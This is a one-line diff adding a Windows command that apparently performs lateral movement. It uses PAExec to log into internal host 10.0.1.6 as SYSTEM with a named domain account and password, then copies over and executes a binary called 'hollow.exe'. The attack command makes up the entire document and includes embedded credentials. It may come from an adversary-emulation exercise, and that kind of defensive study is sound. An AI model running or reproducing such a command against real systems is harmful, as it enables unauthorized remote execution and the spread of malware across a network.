@@ -1,0 +1,1 @@
+cmd.exe /c ".\paexec.exe \\10.0.1.6 -s -u hospitality\kmitnick -p c3aa78cd0827b8e8603ac1c8996e6556 -c -csrc \".\hollow.exe\" hollow.exe"
